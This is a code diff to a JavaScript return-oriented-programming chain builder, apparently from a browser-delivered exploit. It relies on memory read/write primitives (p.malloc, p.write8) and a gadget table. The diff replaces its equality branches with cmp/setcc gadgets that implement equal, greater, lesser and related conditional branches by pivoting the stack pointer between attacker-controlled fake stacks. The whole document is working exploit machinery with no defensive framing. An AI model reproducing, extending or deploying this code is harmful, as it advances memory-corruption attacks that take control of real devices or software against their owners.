@@ -10,13 +10,13 @@ window.rop = function () {
   this.stack_array = this.stackback.backing;
   this.retval = this.stack.add32(0x3FFF8);
   this.count = 1;
-  this.equality_count = 0;
-  this.equality_rsps = p.malloc(0x200);
+  this.branches_count = 0;
+  this.branches_rsps = p.malloc(0x200);
   this.useless_buffer = p.malloc(8);
 
   this.clear = function () {
     this.count = 1;
-    this.equality_count = 0;
+    this.branches_count = 0;
 
     for (var i = 1; i < ((stack_sz / 4) - stack_reserved_idx); i++) {
       this.stack_array[i + stack_reserved_idx] = 0;
@@ -139,74 +139,117 @@ window.rop = function () {
     this.push(window.gadgets["pop rsp"]);
     this.push(rsp);
   }
-  //setup branching, arg1 gets dereferenced and compared against the 2nd
-  //return pointer that you'll need to give to set_equality_branches
-  this.create_equality_branch = function (value_addr, compare_value) {
 
-    var equality_addr_spc = this.equality_rsps.add32(this.equality_count * 0x10);
-    this.equality_count++;
-
+  this.create_equal_branch = function (value_addr, compare_value) {
+    var branch_addr_spc = this.branches_rsps.add32(this.branches_count * 0x10);
+    this.branches_count++;
 
     this.push(window.gadgets["pop rax"]);
     this.push(0);
     this.push(window.gadgets["pop rcx"]);
     this.push(value_addr);
-    this.push(window.gadgets["mov ebp, [rcx]"]);
     this.push(window.gadgets["pop rdi"]);
     this.push(compare_value);
-    this.push(window.gadgets["sub edi, ebp"]);
-    this.push(window.gadgets["adc eax, 0"]);
-    this.push(window.gadgets["pop rdi"]);
-    this.push(compare_value);
-    this.push(window.gadgets["sub ebp, edi"]);
-    this.push(window.gadgets["adc eax, 0"]);
-    
-    this.push(window.gadgets["pop rcx"]);
-    this.push(8);
-    this.push(window.gadgets["imul rax, rcx"]);
+    this.push(window.gadgets["cmp [rcx], edi"]);
+    this.push(window.gadgets["setne al"]);
+    this.push(window.gadgets["shl rax, 3"]);
     this.push(window.gadgets["pop rdx"]);
-    this.push(equality_addr_spc);
+    this.push(branch_addr_spc);
     this.push(window.gadgets["add rax, rdx"]);
     this.push(window.gadgets["mov rax, [rax]"]);
-    this.push(window.gadgets["mov rdx, rax"]);
-    this.push(window.gadgets["pop rax"]);
-    this.push(window.gadgets["ret"]);
-    this.push(window.gadgets["mov rsp, rdx; jmp rax"]);
+    this.push(window.gadgets["xchg rax, rsp"]);
 
-    return equality_addr_spc;
+    return branch_addr_spc;
+
   }
-  this.create_bigger_or_equal_branch = function (value_addr, compare_value) {
-
-    var equality_addr_spc = this.equality_rsps.add32(this.equality_count * 0x10);
-    this.equality_count++;
+  this.create_greater_branch = function (value_addr, compare_value) {
+    var branch_addr_spc = this.branches_rsps.add32(this.branches_count * 0x10);
+    this.branches_count++;
 
     this.push(window.gadgets["pop rax"]);
     this.push(0);
-    this.push(window.gadgets["pop rdi"]);
+    this.push(window.gadgets["pop rcx"]);
     this.push(value_addr);
-    this.push(window.gadgets["mov ebp, [rdi]"]);
     this.push(window.gadgets["pop rdi"]);
     this.push(compare_value);
-    this.push(window.gadgets["sub ebp, edi"]);
-    this.push(window.gadgets["adc eax, 0"]);
-
-    this.push(window.gadgets["pop rcx"]);
-    this.push(8);
-    this.push(window.gadgets["imul rax, rcx"]);
+    this.push(window.gadgets["cmp [rcx], edi"]);
+    this.push(window.gadgets["setle al"]);
+    this.push(window.gadgets["shl rax, 3"]);
     this.push(window.gadgets["pop rdx"]);
-    this.push(equality_addr_spc);
+    this.push(branch_addr_spc);
     this.push(window.gadgets["add rax, rdx"]);
     this.push(window.gadgets["mov rax, [rax]"]);
-    this.push(window.gadgets["mov rdx, rax"]);
-    this.push(window.gadgets["pop rax"]);
-    this.push(window.gadgets["ret"]);
-    this.push(window.gadgets["mov rsp, rdx; jmp rax"]);
+    this.push(window.gadgets["xchg rax, rsp"]);
 
-    return equality_addr_spc;
+    return branch_addr_spc;
   }
-  this.set_equality_branches = function (eq_addr_sp, equal_branch, unequal_branch) {
-    p.write8(eq_addr_sp.add32(0x0), equal_branch);
-    p.write8(eq_addr_sp.add32(0x8), unequal_branch);
+  this.create_greater_or_equal_branch = function (value_addr, compare_value) {
+    var branch_addr_spc = this.branches_rsps.add32(this.branches_count * 0x10);
+    this.branches_count++;
+
+    this.push(window.gadgets["pop rax"]);
+    this.push(0);
+    this.push(window.gadgets["pop rcx"]);
+    this.push(value_addr);
+    this.push(window.gadgets["pop rdi"]);
+    this.push(compare_value);
+    this.push(window.gadgets["cmp [rcx], edi"]);
+    this.push(window.gadgets["setl al"]);
+    this.push(window.gadgets["shl rax, 3"]);
+    this.push(window.gadgets["pop rdx"]);
+    this.push(branch_addr_spc);
+    this.push(window.gadgets["add rax, rdx"]);
+    this.push(window.gadgets["mov rax, [rax]"]);
+    this.push(window.gadgets["xchg rax, rsp"]);
+
+    return branch_addr_spc;
+  }
+  this.create_lesser_branch = function (value_addr, compare_value) {
+    var branch_addr_spc = this.branches_rsps.add32(this.branches_count * 0x10);
+    this.branches_count++;
+
+    this.push(window.gadgets["pop rax"]);
+    this.push(0);
+    this.push(window.gadgets["pop rcx"]);
+    this.push(value_addr);
+    this.push(window.gadgets["pop rdi"]);
+    this.push(compare_value);
+    this.push(window.gadgets["cmp [rcx], edi"]);
+    this.push(window.gadgets["setge al"]);
+    this.push(window.gadgets["shl rax, 3"]);
+    this.push(window.gadgets["pop rdx"]);
+    this.push(branch_addr_spc);
+    this.push(window.gadgets["add rax, rdx"]);
+    this.push(window.gadgets["mov rax, [rax]"]);
+    this.push(window.gadgets["xchg rax, rsp"]);
+
+    return branch_addr_spc;
+  }
+  this.create_lesser_or_equal_branch = function (value_addr, compare_value) {
+    var branch_addr_spc = this.branches_rsps.add32(this.branches_count * 0x10);
+    this.branches_count++;
+
+    this.push(window.gadgets["pop rax"]);
+    this.push(0);
+    this.push(window.gadgets["pop rcx"]);
+    this.push(value_addr);
+    this.push(window.gadgets["pop rdi"]);
+    this.push(compare_value);
+    this.push(window.gadgets["cmp [rcx], edi"]);
+    this.push(window.gadgets["setg al"]);
+    this.push(window.gadgets["shl rax, 3"]);
+    this.push(window.gadgets["pop rdx"]);
+    this.push(branch_addr_spc);
+    this.push(window.gadgets["add rax, rdx"]);
+    this.push(window.gadgets["mov rax, [rax]"]);
+    this.push(window.gadgets["xchg rax, rsp"]);
+
+    return branch_addr_spc;
+  }
+
+  this.set_branch_points = function (branch_addr_sp, rsp_condition_met, rsp_condition_not_met) {
+    p.write8(branch_addr_sp.add32(0x0), rsp_condition_met);
+    p.write8(branch_addr_sp.add32(0x8), rsp_condition_not_met);
   }
 
   this.run = function () {
